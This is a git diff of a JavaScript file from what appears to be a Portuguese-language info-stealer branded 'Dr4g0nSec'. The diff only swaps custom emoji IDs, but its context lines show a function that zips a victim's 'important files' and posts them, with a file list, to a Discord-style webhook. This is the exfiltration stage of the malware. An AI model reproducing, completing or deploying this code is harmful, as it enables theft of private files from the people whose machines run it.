@@ -85,7 +85,7 @@ function createZipFileSync(files) {
 }
 
 async function sendFileToWebhook(webhookUrl, zipPath, foundFiles) {
-    let description = `<:procurar:1361786245461577889> • ***Total de arquivos encontrados:* __${foundFiles.length}__**\n\n📁 • **ARQUIVOS ENCONTRADOS:**\n`;
+    let description = `<:procurar:1378143041960804393> • ***Total de arquivos encontrados:* __${foundFiles.length}__**\n\n📁 • **ARQUIVOS ENCONTRADOS:**\n`;
 
     for (const file of foundFiles) {
         const line = `└─< _${path.basename(file)}_\n`;
@@ -102,7 +102,7 @@ async function sendFileToWebhook(webhookUrl, zipPath, foundFiles) {
         username: "Dr4g0nSec | Arquivos Info",
         avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
         embeds: [{
-            title: "<:dr4g0n:1362932398102155475> Arquivos Importantes <:dr4g0n:1362932398102155475>",
+            title: "Arquivos Importantes",
             description: description,
             color: 0x250e80,
             footer: {
